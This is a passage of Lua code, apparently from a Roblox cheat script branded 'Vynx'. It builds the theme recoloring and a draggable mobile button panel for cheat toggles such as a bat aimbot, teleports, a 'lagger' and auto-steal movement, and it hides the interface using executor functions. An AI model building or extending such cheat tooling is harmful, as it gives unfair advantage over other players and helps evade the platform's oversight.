        if M.pingMain and M.pingMain.Parent then M.pingMain.Position = pingDefault end
    end)
    pcall(function()
        if M.killLaggerMain and M.killLaggerMain.Parent then M.killLaggerMain.Position = lagDefault end
    end)
    pcall(function() if saveCherryConfig then saveCherryConfig() end end)
end

function M.resetMobilePositions()

    M.stealBarPos = nil
    pcall(function()
        if M.statusHolder then
            local barW = (M.stealBarStyle == "New") and math.clamp(math.max(tonumber(M.stealBarSize) or 390, 360), 360, 480) or math.max(tonumber(M.stealBarSize) or 320, 300)
            M.statusHolder.Position = UDim2.new(0.5, -math.floor(barW / 2), 1, (M.stealBarStyle == "New") and -78 or -60)
        end
    end)
    pcall(saveCherryConfig)

    pcall(function()
        if type(delfile) == "function" then
            delfile(M.MOB_POS_FILE)
        elseif type(writefile) == "function" then
            writefile(M.MOB_POS_FILE, "{}")
        end
    end)
    pcall(function()
        if isfile and isfile(M.MOB_POS_FILE) and type(writefile) == "function" then
            writefile(M.MOB_POS_FILE, "{}")
        end
    end)
    M._forceDefaultMobPos = true
    M.buildMobileButtons()
    M._forceDefaultMobPos = false

    pcall(function()
        if not M.mobGuiRef then return end
        local out = {}
        for _, child in ipairs(M.mobGuiRef:GetDescendants()) do
            if child:IsA("TextButton") and child:GetAttribute("BtnKey") then
                local key = child:GetAttribute("BtnKey")
                local dx = child:GetAttribute("DefaultX")
                local dy = child:GetAttribute("DefaultY")
                if typeof(dx) == "number" and typeof(dy) == "number" then
                    child.Position = UDim2.new(0, dx, 0, dy)
                    out[key] = {x = dx, y = dy}
                end
            end
        end
        if writefile then
            writefile(M.MOB_POS_FILE, HS:JSONEncode(out))
        end
    end)
end

function M.getThemeAccent()
    local a = UI_ACCENT or CHERRY_ACCENT
    if typeof(a) == "Color3" then return a end
    local n = tostring(M.colorScheme or M._savedTheme or "")
    if n == "Purple" or n == "Purple Vynx" then return Color3.fromRGB(140, 35, 210) end
    return Color3.fromRGB(255, 255, 255)
end
function M.isPurpleTheme()
    local n = tostring(M.colorScheme or M._savedTheme or "")
    return n == "Purple" or n == "Purple Vynx"
end
function M.refreshVynxBrandColors()
    local col = M.getThemeAccent()
    local char = player.Character
    if char then
        for _, d in ipairs(char:GetDescendants()) do
            if d:IsA("TextLabel") and (d.Text == "VYNX" or (d.Parent and (d.Parent.Name == "VynxBellyTag" or d.Parent.Name == "VynxPantsTag" or d.Parent.Name == "VynxHatLabel"))) then
                pcall(function() d.TextColor3 = col end)
            end
        end
    end
    if M.mobGuiRef then
        for _, d in ipairs(M.mobGuiRef:GetDescendants()) do
            if d:IsA("TextLabel") and d.Text == "VYNX" then
                pcall(function() d.TextColor3 = col end)
            end
        end
    end
    if M.statusStealLbl then pcall(function() end) end
end

function M.isNearRed(c, threshold)
    if typeof(c) ~= "Color3" then return false end
    local r, g, b = c.R, c.G, c.B

    if r > 0.35 and r > g + 0.08 and r > b + 0.08 and g < 0.55 and b < 0.55 then return true end
    if r > 0.5 and g < 0.4 and b < 0.4 then return true end
    return false
end

function M.forceThemeNoRed()
    local accent = UI_ACCENT or (M.getThemeAccent and M.getThemeAccent()) or Color3.fromRGB(255, 255, 255)
    local isPurple = M.isPurpleTheme and M.isPurpleTheme() or false
    if not isPurple then
        if M.recolorLiveAccents then M.recolorLiveAccents() end
        if M.sweepAccentRecolor then M.sweepAccentRecolor() end
        return
    end
    if M.recolorLiveAccents then M.recolorLiveAccents() end
    local roots = {}
    for _, g in ipairs({M.mainFrame, M.gui, M.mobGuiRef, M.statusGui, M.pingGui, M.killLaggerGui, M.topBannerGui}) do
        if g then table.insert(roots, g) end
    end
    for _, rt in ipairs(roots) do
        if not rt then continue end
        for _, d in ipairs(rt:GetDescendants()) do
            if d:IsA("GuiObject") then
                pcall(function()
                    if M.isNearRed and M.isNearRed(d.BackgroundColor3) then
                        d.BackgroundColor3 = accent
                    end
                end)
            end
            if d:IsA("TextLabel") or d:IsA("TextButton") or d:IsA("TextBox") then
                pcall(function()
                    if M.isNearRed and M.isNearRed(d.TextColor3) then
                        d.TextColor3 = accent
                    end
                end)
            end
            if d:IsA("UIStroke") then
                pcall(function()
                    if M.isNearRed and M.isNearRed(d.Color) then
                        d.Color = accent
                    end
                end)
            end
        end
    end
end

function M.recolorLiveAccents(root)
    local accent = UI_ACCENT or CHERRY_ACCENT or Color3.fromRGB(255, 255, 255)
    local dim = UI_ACCENT_DIM or accent:Lerp(Color3.new(0,0,0), 0.35)
    local roots = {}
    if root then table.insert(roots, root) end
    if M.mainFrame then table.insert(roots, M.mainFrame) end
    if M.gui and M.gui ~= M.mainFrame then table.insert(roots, M.gui) end
    if M.mobGuiRef then table.insert(roots, M.mobGuiRef) end
    if M.statusGui then table.insert(roots, M.statusGui) end
    if M.pingGui then table.insert(roots, M.pingGui) end
    local seen = {}
    for _, rt in ipairs(roots) do
        if rt and rt.Parent and not seen[rt] then
            seen[rt] = true
            for _, d in ipairs(rt:GetDescendants()) do

                if d:GetAttribute("ThemeAccent") then
                    if d:IsA("TextLabel") or d:IsA("TextButton") then
                        pcall(function() d.TextColor3 = accent end)
                    end
                    if d:IsA("Frame") or d:IsA("TextButton") then

                        pcall(function()
                            if d.BackgroundTransparency < 0.95 then
                                d.BackgroundColor3 = accent
                            end
                        end)
                    end
                end
                if d:GetAttribute("ThemeChip") then
                    if d:IsA("Frame") or d:IsA("TextButton") then
                        local active = d:GetAttribute("ChipActive")
                        if active == false then

                        else
                            pcall(function() d.BackgroundColor3 = accent end)
                        end
                    end
                end
                if d:GetAttribute("ThemeToggle") and d:IsA("GuiObject") then

                    pcall(function()
                        local knob = d:FindFirstChildOfClass("Frame")
                        if knob and knob.Position.X.Scale >= 0.5 then
                            d.BackgroundColor3 = accent
                        end
                    end)
                end

                if d.Name == "SectionLabel" and d:IsA("TextLabel") then
                    pcall(function() d.TextColor3 = accent end)
                end
                if d.Name == "SectionBar" and d:IsA("Frame") then
                    pcall(function() d.BackgroundColor3 = accent end)
                end
                if d.Name == "VynxChip" and d:IsA("Frame") then
                    pcall(function() d.BackgroundColor3 = accent end)
                end
                if d.Name == "NumBox" and d:IsA("TextBox") then
                    pcall(function() d.TextColor3 = accent end)
                end
                if d:IsA("TextBox") and d:GetAttribute("ThemeAccent") then
                    pcall(function() d.TextColor3 = accent end)
                end
                if d.Name == "AccentBar" and d:IsA("Frame") then
                    pcall(function()
                        if d.BackgroundTransparency < 0.9 then d.BackgroundColor3 = accent end
                    end)
                end
                if d.Name == "ToggleTrack" and d:IsA("GuiObject") then
                    pcall(function()
                        local knob = d:FindFirstChildOfClass("Frame")

                        local on = false
                        if knob and (knob.Position.X.Scale >= 0.5 or knob.Position.X.Offset > 10) then on = true end
                        if on or M.isNearRed(d.BackgroundColor3) then
                            d.BackgroundColor3 = accent
                        end
                    end)
                end

                if d:IsA("GuiObject") and not d:IsA("ImageLabel") then
                    local ok, col = pcall(function() return d.BackgroundColor3 end)
                    if ok and M.isNearRed(col) then

                        local name = d.Name or ""
                        if name ~= "Main" and name ~= "MainFrame" and name ~= "ContentRoot" and name ~= "Dim" then
                            pcall(function() d.BackgroundColor3 = accent end)
                        end
                    end
                end
                if d:IsA("TextLabel") or d:IsA("TextButton") then
                    local ok, col = pcall(function() return d.TextColor3 end)
                    if ok and M.isNearRed(col) then
                        pcall(function() d.TextColor3 = accent end)
                    end
                end
                if d:IsA("UIStroke") then
                    local ok, col = pcall(function() return d.Color end)
                    if ok and M.isNearRed(col) then
                        pcall(function() d.Color = accent end)
                    end
                end
            end
        end
    end
end

function M.refreshMobileButtonTheme()
    if not M.mobGuiRef or not M.mobGuiRef.Parent then return end

    local accent = ((M.accentColor and M.accentColor()) or Color3.fromRGB(0, 130, 200))
    local dim = Color3.fromRGB(12, 12, 18)
    for _, d in ipairs(M.mobGuiRef:GetDescendants()) do
        if d.Name == "VynxChip" and d:IsA("Frame") then
            d.BackgroundColor3 = accent
        end
        if d:IsA("UIStroke") and (d.Name == "BtnStroke" or (d.Parent and d.Parent:GetAttribute("MB_On"))) then

            local par = d.Parent
            if par and par:GetAttribute("MB_On") then
                d.Color = accent
            end
        end
    end
    local offTop = M.themeDarkFromAccent(accent, 0.28)
    local offBot = M.themeDarkFromAccent(accent, 0.10)
    for _, child in ipairs(M.mobGuiRef:GetDescendants()) do
        if child:IsA("ImageLabel") and child.Name == "BtnBgImage" then
            child.ImageColor3 = Color3.fromRGB(255, 255, 255)
        end
        if child:IsA("UIStroke") and (child.Name == "BtnStroke" or child.Parent and child.Parent:IsA("TextButton")) then
            local btn = child.Parent
            local on = btn and btn:GetAttribute("MB_On") == true
            if on then
                child.Color = accent
                child.Transparency = 0
                child.Thickness = 2
            else
                child.Color = dim
                child.Transparency = 0.25
                child.Thickness = 1.5
            end
        end
        if child:IsA("UIGradient") and child.Name == "BtnGrad" then
            local btn = child.Parent
            local on = btn and btn:GetAttribute("MB_On") == true
            if on then
                child.Color = ColorSequence.new(accent:Lerp(Color3.new(1,1,1), 0.35), accent)
            else
                child.Color = ColorSequence.new(offTop, offBot)
            end
        end
        if child:IsA("UIGradient") and child.Parent and child.Parent.Name:find("MobCont_", 1, true) then
            child.Color = ColorSequence.new(offTop, offBot)
        end
        if child:IsA("UIStroke") and child.Parent and child.Parent.Name:find("MobCont_", 1, true) then
            child.Color = dim
        end
    end

    for key, setOn in pairs(M.mobBtnRefs or {}) do
        if type(setOn) == "function" then

            pcall(function()
                local cont = M.mobGuiRef:FindFirstChild("MobCont_" .. key)
                local btn = cont and cont:FindFirstChild("Btn_" .. key)
                if btn then
                    setOn(btn:GetAttribute("MB_On") == true)
                end
            end)
        end
    end
end

function M.placeDotsOn(target, count, cornerR, seed)
    if not target then return end
    local old = target:FindFirstChild("DotPattern")
    if old then pcall(function() old:Destroy() end) end
    local dots = Instance.new("Frame")
    dots.Name = "DotPattern"
    dots.BackgroundTransparency = 1
    dots.Size = UDim2.fromScale(1, 1)
    dots.ZIndex = (target.ZIndex or 1)
    dots.ClipsDescendants = true
    dots.Parent = target
    Instance.new("UICorner", dots).CornerRadius = UDim.new(0, cornerR or 12)
    local rng = Random.new(tonumber(seed) or 42)
    count = tonumber(count) or 24
    for i = 1, count do
        local d = Instance.new("Frame")
        d.Name = "Dot"
        local sz = rng:NextNumber(0.6, 1.8)
        d.Size = UDim2.new(0, sz, 0, sz)
        d.Position = UDim2.new(rng:NextNumber(0.04, 0.96), 0, rng:NextNumber(0.08, 0.92), 0)
        d.AnchorPoint = Vector2.new(0.5, 0.5)
        d.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        d.BackgroundTransparency = rng:NextNumber(0.50, 0.88)
        d.BorderSizePixel = 0
        d.ZIndex = dots.ZIndex
        d.Parent = dots
        Instance.new("UICorner", d).CornerRadius = UDim.new(1, 0)
    end
end

function M.refreshOriginalModeMobileButtons()
    local show = (M.speedUIMode or "Original") == "Original"
    local keys = {"carrySpeed", "lagger", "laggerCarry"}
    if M.mobBtnFrames then
        for _, k in ipairs(keys) do
            local f = M.mobBtnFrames[k]
            if f and f.Parent then
                pcall(function() f.Visible = show end)
            end
        end
    end
end

function M.buildMobileButtons()
    if M._introUIReady == false then
        M._pendingMobileButtons = true
        return
    end
    M.destroyMobileButtons()
    if not M.mobileButtonsEnabled then return end

    -- ALWAYS snapshot current positions before destroy so circle/visibility rebuild keeps them
    pcall(function()
        if M.saveBtnPositions and M.mobBtnFrames and next(M.mobBtnFrames) then
            M.saveBtnPositions()
        end
    end)

    local LAYOUT_VER = 27
    -- Never auto-wipe saved positions on version bump (was resetting on every rejoin)
    if M._mobLayoutVer == nil then
        M._mobLayoutVer = LAYOUT_VER
    else
        M._mobLayoutVer = LAYOUT_VER
    end

    local savedPositions
    if M._forceDefaultMobPos then
        savedPositions = {}
        M._forceDefaultMobPos = false
        M._btnPosCache = {}
    else
        savedPositions = (M.loadBtnPositions and M.loadBtnPositions() or {}) or {}
        if type(M._btnPosCache) == "table" then
            for k, v in pairs(M._btnPosCache) do
                if not savedPositions[k] and type(v) == "table" then
                    savedPositions[k] = v
                end
            end
        end
    end

    local RED = ((M.accentColor and M.accentColor()) or Color3.fromRGB(0, 130, 200))
    local W = Color3.fromRGB(255, 255, 255)
    local HOV = Color3.fromRGB(18, 18, 22)
    local OFF_BG = Color3.fromRGB(10, 10, 14)
    local ON_BG = ((M.accentColor and M.accentColor()) or Color3.fromRGB(0, 130, 200))
    local OFF_STROKE = Color3.fromRGB(28, 28, 34)
    local ON_STROKE = ((M.accentColor and M.accentColor()) or Color3.fromRGB(0, 130, 200))
    local ON_TEXT = Color3.fromRGB(255, 255, 255)
    local FRAME_W = 130
    local btnSizeSetting = math.clamp(tonumber(M.mobileButtonsSize) or 60, 40, 150)
    local btnScale = btnSizeSetting / 60
    local BTN_SIZE = math.max(46, math.floor(58 * btnScale + 0.5))
    local BTN_W = BTN_SIZE
    local BTN_H = BTN_SIZE
    local GAP_X, GAP_Y = 4, 4
    local ROW_STEP = BTN_H + GAP_Y
    local COL_STEP = BTN_W + GAP_X

    local mobGui = Instance.new("ScreenGui")
    mobGui.Name = "MoveeMobileButtons"
    mobGui.ResetOnSpawn = false
    mobGui.DisplayOrder = 100
    mobGui.IgnoreGuiInset = true
    mobGui.Enabled = true
    pcall(function() if syn and syn.protect_gui then syn.protect_gui(mobGui) end end)
    local parented = false
    if gethui then parented = pcall(function() mobGui.Parent = gethui() end) end
    if not parented then parented = pcall(function() mobGui.Parent = game:GetService("CoreGui") end) end
    if not parented then mobGui.Parent = player:WaitForChild("PlayerGui") end

    M.mobGuiRef = mobGui
    pcall(function() if M.registerAccentRoot then M.registerAccentRoot(mobGui) end end)
    M.mobBtnRefs = M.mobBtnRefs or {}
    M.mobBtnFrames = {}

    local allDefs = {
        {key = "autoLeft",    label = "AUTO\nLEFT",     toggle = true,  gcol = 0, grow = 0},
        {key = "autoRight",   label = "AUTO\nRIGHT",    toggle = true,  gcol = 1, grow = 0},
        {key = "autoBat",     label = "BAT\nAIMBOT",    toggle = true,  gcol = 0, grow = 1},
        {key = "batTP",       label = "BAT\nTP",        toggle = true,  gcol = 1, grow = 1},
        {key = "drop",        label = "DROP",           toggle = false, gcol = 0, grow = 2},
        {key = "tpDown",      label = "TP\nDOWN",       toggle = false, gcol = 1, grow = 2},
        {key = "reset",       label = "INSTA\nRESET",   toggle = false, gcol = 0, grow = 3},
        {key = "laggerCarry", label = "LAGGER\nCARRY",  toggle = true,  gcol = 1, grow = 3},
        {key = "lagger",      label = "LAGGER\nNORMAL", toggle = true,  gcol = 0, grow = 4},
        {key = "carrySpeed",  label = "CARRY\nMODE",    toggle = true,  gcol = 1, grow = 4},
    }
    if type(M.mobileBtnVisible) ~= "table" then
        M.mobileBtnVisible = {}
        for _, d in ipairs(allDefs) do M.mobileBtnVisible[d.key] = true end
    end
    local defs = {}
    local col, row, colN = 0, 0, 2
    for _, d in ipairs(allDefs) do
        local vis = M.mobileBtnVisible[d.key]
        if vis ~= false then
            local nd = {
                key = d.key, label = d.label, toggle = d.toggle,
                gcol = col, grow = row,
            }
            table.insert(defs, nd)
            col = col + 1
            if col >= colN then col = 0; row = row + 1 end
        end
    end

    local mobileButtonsFrame = Instance.new("Frame")
    mobileButtonsFrame.Name = "CursedMobileButtonsFrame"
    mobileButtonsFrame.Size = UDim2.new(1, 0, 1, 0)
    mobileButtonsFrame.Position = UDim2.new(0, 0, 0, 0)
    mobileButtonsFrame.BackgroundTransparency = 1
    mobileButtonsFrame.BorderSizePixel = 0
    mobileButtonsFrame.Active = false
    mobileButtonsFrame.Selectable = false
    mobileButtonsFrame.Visible = true
    mobileButtonsFrame.ZIndex = 25
    mobileButtonsFrame.Parent = mobGui
    M.mobileButtonsFrame = mobileButtonsFrame

    -- Centre mini hub pill removed
    M.vynxHubPill = nil


    local mobileDragMoved = false
    local function isMobileDragTarget(obj)
        return obj == mobileButtonsFrame or (obj and obj.Parent == mobileButtonsFrame)
    end

    local function drag(obj, target)
        local dragging, dragStart, startPos, dragInput = false, nil, nil, nil
        local moveTarget = target or obj
        obj.InputBegan:Connect(function(input)
            if isMobileDragTarget(moveTarget) then mobileDragMoved = false end
            if isMobileDragTarget(moveTarget) and M.mobileButtonsLocked then return end
            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                dragging = true
                dragStart = input.Position
                startPos = moveTarget.Position
                input.Changed:Connect(function()
                    if input.UserInputState == Enum.UserInputState.End then dragging = false end
                end)
            end
        end)
        obj.InputChanged:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
                dragInput = input
            end
        end)
        UIS.InputChanged:Connect(function(input)
            if isMobileDragTarget(moveTarget) and M.mobileButtonsLocked then dragging = false return end
            if input == dragInput and dragging then
                if isMobileDragTarget(moveTarget) then
                    local dx = input.Position.X - dragStart.X
                    local dy = input.Position.Y - dragStart.Y
                    if (dx * dx + dy * dy) > 36 then mobileDragMoved = true end
                end
                moveTarget.Position = UDim2.new(
                    startPos.X.Scale, startPos.X.Offset + (input.Position.X - dragStart.X),
                    startPos.Y.Scale, startPos.Y.Offset + (input.Position.Y - dragStart.Y)
                )
            end
        end)
        obj.InputEnded:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                if dragging then
                    dragging = false
                    if M.saveBtnPositions then pcall(M.saveBtnPositions) end
                    pcall(function() if saveCherryConfig then saveCherryConfig() end end)
                end
            end
        end)
        UIS.InputEnded:Connect(function(input)
            if not dragging then return end
            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                dragging = false
                if M.saveBtnPositions then pcall(M.saveBtnPositions) end
                pcall(function() if saveCherryConfig then saveCherryConfig() end end)
            end
        end)
    end

    local function getClassicButtonPos(def)
        -- 2 columns on the right, slightly above bottom (poco più su)
        local COLS = 2
        local ROWS = 5
        local gridW = COLS * BTN_W + (COLS - 1) * GAP_X
        local gridH = ROWS * BTN_H + (ROWS - 1) * GAP_Y
        local margin = 14
        local bottomPad = 96
        local col = def.gcol or 0
        local row = def.grow or 0
        return UDim2.new(
            1, -(gridW + margin) + col * (BTN_W + GAP_X),
            1, -(gridH + bottomPad) + row * (BTN_H + GAP_Y)
        )
    end

    local function setMobileButton(key, on)
        local btn = M.mobBtnFrames and M.mobBtnFrames[key]
        if not btn then return end
        local stroke = btn:FindFirstChild("BtnStroke")
        btn:SetAttribute("MB_On", on == true)
        -- TS style: keep dark fill, show ocean contour when active (not solid color fill)
        local oceanMid = Color3.fromRGB(80, 175, 230)
        local oceanLite = Color3.fromRGB(150, 220, 255)
        local ocean = ((M.accentColor and M.accentColor()) or oceanLite)
        TweenService:Create(
            btn,
            TweenInfo.new(0.12),
            {
                BackgroundColor3 = OFF_BG,
                TextColor3 = Color3.fromRGB(255, 255, 255),
            }
        ):Play()
        if stroke then
            if on then
                stroke.Color = ocean
                stroke.Thickness = 3.2
                stroke.Transparency = 0
                stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
            else
                stroke.Color = OFF_STROKE
                stroke.Thickness = 1.4
                stroke.Transparency = 0.25
            end
        end
        local g = btn:FindFirstChild("MobTextGrad")
        if g then g.Enabled = false end
    end

    local function stateFor(key)
        if key == "autoLeft" then return M.autoLeftEnabled == true end
        if key == "autoRight" then return M.autoRightEnabled == true end
        if key == "autoBat" then return M.autoBatEnabled == true end
        if key == "batTP" then return M.batTPEnabled == true end
        if key == "lagger" then return M.laggerModeEnabled == true end
        if key == "laggerCarry" then return M.laggerCarryActive == true end
        if key == "carrySpeed" then return M.carrySpeedActive == true end
        return false
    end

    local function refreshAll()
        setMobileButton("autoLeft", M.autoLeftEnabled == true)
        setMobileButton("autoRight", M.autoRightEnabled == true)
        setMobileButton("autoBat", M.autoBatEnabled == true)
        setMobileButton("batTP", M.batTPEnabled == true)
        setMobileButton("lagger", M.laggerModeEnabled == true)
        setMobileButton("laggerCarry", M.laggerCarryActive == true)
        setMobileButton("carrySpeed", M.carrySpeedActive == true)
        if M.setMobVisual then pcall(function() M.setMobVisual(M.mobileButtonsEnabled == true) end) end
        if M.setLockVisual then pcall(function() M.setLockVisual(M.mobileButtonsLocked == true) end) end
    end

    for _, def in ipairs(defs) do
        local key = def.key
        local btn = Instance.new("TextButton")
        btn.Name = "StackBtn_" .. key
        btn.Size = UDim2.new(0, BTN_W, 0, BTN_H)
        local saved = savedPositions and savedPositions[key]
        if saved and type(saved.ox) == "number" and type(saved.oy) == "number" then
            btn.Position = UDim2.new(0, saved.ox, 0, saved.oy)
        elseif saved and type(saved.sx) == "number" and type(saved.sy) == "number" then
            btn.Position = UDim2.new(saved.sx, tonumber(saved.ox) or 0, saved.sy, tonumber(saved.oy) or 0)
        elseif saved and type(saved.x) == "number" and type(saved.y) == "number" then
            btn.Position = UDim2.new(0, saved.x, 0, saved.y)
        else
            btn.Position = getClassicButtonPos(def)
        end
        btn.BackgroundColor3 = OFF_BG
        btn.BorderSizePixel = 0
        btn.Text = def.label
        btn.TextColor3 = Color3.fromRGB(255, 255, 255)
        btn.Font = Enum.Font.GothamBold
        btn.TextSize = math.clamp(math.floor(11 * btnScale + 0.5), 10, 16)
        btn.TextWrapped = true
        btn.TextStrokeTransparency = 1
        btn.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
        do
            local oldG = btn:FindFirstChild("MobTextGrad")
            if oldG then pcall(function() oldG:Destroy() end) end
            local g = Instance.new("UIGradient")
            g.Name = "MobTextGrad"
            g.Rotation = 0
            do
                local _a = ((M.accentColor and M.accentColor()) or Color3.fromRGB(0, 130, 200))
                g.Color = ColorSequence.new({
                    ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)),
                    ColorSequenceKeypoint.new(0.48, Color3.fromRGB(255, 255, 255)),
                    ColorSequenceKeypoint.new(0.52, _a:Lerp(Color3.fromRGB(255, 255, 255), 0.25)),
                    ColorSequenceKeypoint.new(1, _a),
                })
                g:SetAttribute("AccentGradient", true)
            end
            g.Parent = btn
        end
        btn.AutoButtonColor = false
        btn.ZIndex = 26
        btn.Active = true
        btn:SetAttribute("BtnKey", key)
        btn:SetAttribute("MB_On", false)
        btn.Parent = mobileButtonsFrame
        Instance.new("UICorner", btn).CornerRadius = M.circleButtonsEnabled and UDim.new(1, 0) or UDim.new(0, 14)
        local stroke = Instance.new("UIStroke")
        stroke.Name = "BtnStroke"
        stroke.Color = OFF_STROKE
        stroke.Thickness = 1.4
        stroke.Transparency = 0.25
        stroke.Parent = btn
        M.mobBtnFrames[key] = btn
        M.mobBtnRefs[key] = function(on) setMobileButton(key, on) end
        drag(btn)

        btn.MouseEnter:Connect(function()
            if not stateFor(key) then
                TweenService:Create(btn, TweenInfo.new(0.1), { BackgroundColor3 = Color3.fromRGB(10, 10, 16) }):Play()
            end
        end)
        btn.MouseLeave:Connect(function()
            refreshAll()
        end)
        btn.InputBegan:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                setMobileButton(key, true)
            end
        end)
        btn.InputEnded:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                task.delay(0.08, function()
                    if M.mobBtnFrames and M.mobBtnFrames[key] then
                        refreshAll()
                    end
                end)
            end
        end)

        local function flashButton(seconds)
            setMobileButton(key, true)
            task.delay(seconds or 0.35, function()
                setMobileButton(key, false)
                refreshAll()
            end)
        end

        btn.Activated:Connect(function()
            if M._anyKeyListening then return end
            if mobileDragMoved then
                mobileDragMoved = false
                refreshAll()
                return
            end
            setMobileButton(key, true)

            if key == "tpDown" then
                flashButton(0.35)
                pcall(function()
                    if M.runTPFloor then M.runTPFloor()
                    elseif M.doAutoTPDown then M.doAutoTPDown(true) end
                end)
                return
            elseif key == "drop" then
                flashButton(0.45)
                task.spawn(function()
                    if M.executeDropWithToggle then
                        M.executeDropWithToggle(function(v) setMobileButton(key, v == true) end)
                    elseif M.runDrop then
                        pcall(M.runDrop)
                    elseif M.runDropBrainrot then
                        pcall(M.runDropBrainrot)
                    end
                    local t0 = tick()
                    while M.dropActive and (tick() - t0) < 1.5 do task.wait() end
                    setMobileButton(key, false)
                    refreshAll()
                end)
                return
            elseif key == "reset" then
                flashButton(0.45)
                task.spawn(function()
                    if M.cursedInstaReset then pcall(M.cursedInstaReset) end
                    task.wait(0.35)
                    setMobileButton(key, false)
                    refreshAll()
                end)
                return
            elseif key == "autoLeft" then
                if M.autoRightEnabled then M.autoRightEnabled = false; if M.stopAutoRight then pcall(M.stopAutoRight) end end
                if M.autoBatEnabled and M.stopBatAimbot then pcall(M.stopBatAimbot) end
                M.autoLeftEnabled = not (M.autoLeftEnabled == true)
                if M.autoLeftEnabled then if M.startAutoLeft then pcall(M.startAutoLeft) end else if M.stopAutoLeft then pcall(M.stopAutoLeft) end end
            elseif key == "autoRight" then
                if M.autoLeftEnabled then M.autoLeftEnabled = false; if M.stopAutoLeft then pcall(M.stopAutoLeft) end end
                if M.autoBatEnabled and M.stopBatAimbot then pcall(M.stopBatAimbot) end
                M.autoRightEnabled = not (M.autoRightEnabled == true)
                if M.autoRightEnabled then if M.startAutoRight then pcall(M.startAutoRight) end else if M.stopAutoRight then pcall(M.stopAutoRight) end end
            elseif key == "autoBat" then
                if M.autoBatEnabled then
                    if M.stopBatAimbot then pcall(M.stopBatAimbot) end
                    M.autoBatEnabled = false
                else
                    if M.autoLeftEnabled then M.autoLeftEnabled = false; if M.stopAutoLeft then pcall(M.stopAutoLeft) end end
                    if M.autoRightEnabled then M.autoRightEnabled = false; if M.stopAutoRight then pcall(M.stopAutoRight) end end
                    M.autoBatEnabled = true
                    if M.queueAutoBatStart then pcall(M.queueAutoBatStart) elseif M.startBatAimbot then pcall(M.startBatAimbot) end
                    M.autoBatEnabled = true
                end
                if M.autoBatSetVisual then pcall(M.autoBatSetVisual, M.autoBatEnabled == true) end
            elseif key == "batTP" then
                if M.toggleBatTPAimbot then pcall(M.toggleBatTPAimbot) end
                if M.setBatTPVisual then pcall(M.setBatTPVisual, M.batTPEnabled == true) end
            elseif key == "lagger" then
                if M.toggleLaggerMode then pcall(M.toggleLaggerMode) else M.laggerModeEnabled = not (M.laggerModeEnabled == true) end
                if M.laggerModeEnabled then M.laggerCarryActive = false; M.carrySpeedActive = false end
                if M._applyLagBtnColor then pcall(M._applyLagBtnColor, M.laggerModeEnabled == true) end
                if M._applyLCBtnColor then pcall(M._applyLCBtnColor, M.laggerCarryActive == true) end
                if M._applyCarryBtnColor then pcall(M._applyCarryBtnColor, M.carrySpeedActive == true) end
            elseif key == "laggerCarry" then
                if M.toggleLaggerCarryMode then pcall(M.toggleLaggerCarryMode) elseif M.toggleLaggerCarry then pcall(M.toggleLaggerCarry) else M.laggerCarryActive = not (M.laggerCarryActive == true) end
                if M.laggerCarryActive then M.laggerModeEnabled = false; M.carrySpeedActive = false end
                if M._applyLCBtnColor then pcall(M._applyLCBtnColor, M.laggerCarryActive == true) end
                if M._applyLagBtnColor then pcall(M._applyLagBtnColor, M.laggerModeEnabled == true) end
                if M._applyCarryBtnColor then pcall(M._applyCarryBtnColor, M.carrySpeedActive == true) end
            elseif key == "carrySpeed" then
                if M.toggleCarryMode then pcall(M.toggleCarryMode) else M.carrySpeedActive = not (M.carrySpeedActive == true) end
                if M.carrySpeedActive then M.laggerCarryActive = false; M.laggerModeEnabled = false end
                if M._applyCarryBtnColor then pcall(M._applyCarryBtnColor, M.carrySpeedActive == true) end
                if M._applyLCBtnColor then pcall(M._applyLCBtnColor, M.laggerCarryActive == true) end
                if M._applyLagBtnColor then pcall(M._applyLagBtnColor, M.laggerModeEnabled == true) end
            end

            refreshAll()
            task.delay(0.05, refreshAll)
            task.delay(0.2, refreshAll)
            pcall(saveCherryConfig)
        end)
    end

    refreshAll()
    pcall(function() M.refreshOriginalModeMobileButtons() end)
end


M._accentSweepRoots = M._accentSweepRoots or {}

function M.registerAccentRoot(inst)
    if typeof(inst) ~= "Instance" then return end
    M._accentSweepRoots[inst] = true
end

function M.isAccentish(c)
    if typeof(c) ~= "Color3" then return false end
    local function near(a, b, tol)
        return math.abs(a.R - b.R) <= tol
           and math.abs(a.G - b.G) <= tol
           and math.abs(a.B - b.B) <= tol
    end
    for _, e in ipairs(M.UI_COLORS or {}) do
        if near(c, e.accent, 0.16) then return true end
    end
    for _, legacy in ipairs({
        Color3.fromRGB(40, 150, 255), Color3.fromRGB(40, 128, 220),
        Color3.fromRGB(30, 134, 210), Color3.fromRGB(30, 120, 255),
        Color3.fromRGB(0, 120, 255),  Color3.fromRGB(0, 150, 255),
        Color3.fromRGB(25, 100, 220), Color3.fromRGB(0, 126, 180),
        Color3.fromRGB(75, 158, 255), Color3.fromRGB(60, 138, 240),
    }) do
        if near(c, legacy, 0.13) then return true end
    end
    local mx = math.max(c.R, c.G, c.B)
    local mn = math.min(c.R, c.G, c.B)
    if mx > 0.42 and (mx - mn) > 0.28 then return true end
    return false
end

local function isForcedAccent(d)
    if d:GetAttribute("ThemeAccent") or d:GetAttribute("BrandAccent")
        or d:GetAttribute("AccentGradient") or d:GetAttribute("ThemeChip") then
        return true
    end
    local n = tostring(d.Name)
    return n == "SectionLabel" or n == "SectionBar" or n == "VynxChip"
        or n == "AccentBar" or n == "NumBox" or n == "MainStroke"
        or n == "HeaderDiscord" or n == "DiscordTag" or n == "BtnStroke"
end

function M.sweepAccentRecolor()
    local accent = (M.accentColor and M.accentColor()) or Color3.fromRGB(0, 130, 200)
    local dim = (M.accentDim and M.accentDim()) or accent:Lerp(Color3.new(0, 0, 0), 0.35)
